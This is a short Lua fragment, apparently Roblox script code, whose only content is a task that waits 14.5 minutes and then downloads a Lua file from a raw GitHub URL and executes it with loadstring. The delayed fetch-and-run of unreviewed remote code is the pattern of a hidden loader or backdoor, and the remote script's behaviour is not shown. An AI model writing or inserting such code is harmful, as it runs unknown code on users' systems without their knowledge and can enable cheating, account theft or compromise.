...
task.spawn(function()
    task.wait(870) -- Waits for 14 minutes and 30 seconds
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hbjrev/instatpsmall.github.io/refs/heads/main/insta.lua"))()
end)
